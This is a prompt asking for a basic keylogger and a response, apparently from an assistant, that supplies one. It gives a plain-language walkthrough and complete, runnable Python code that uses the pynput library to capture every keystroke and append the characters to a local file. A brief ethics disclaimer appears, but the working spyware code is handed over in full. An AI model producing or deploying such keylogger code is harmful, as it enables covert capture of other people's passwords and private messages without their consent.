Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

This script demonstrates basic keystroke logging functionality using the pynput library. 

Important Note: Keyloggers pose significant ethical and security risks. This code is provided for educational purposes only to understand their potential dangers. Never deploy a keylogger on a system without explicit consent.

Functionality (Educational Overview):

Imports: The script imports the keyboard module from the pynput library.
keyPressed Function: This function handles key presses.
It attempts to convert the pressed key to a character (e.g., 'a', 'b').
If successful, it writes the character to a file named "keyfile.txt" in append mode.
Errors (special keys) are caught and reported.
Main Execution:
A Listener object is created to listen for key presses.
The listener is started, triggering the keyPressed function on each key press.
The script waits for the user to press any key to stop logging (using input()).

CODE :-

#A Simple Keylogger
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
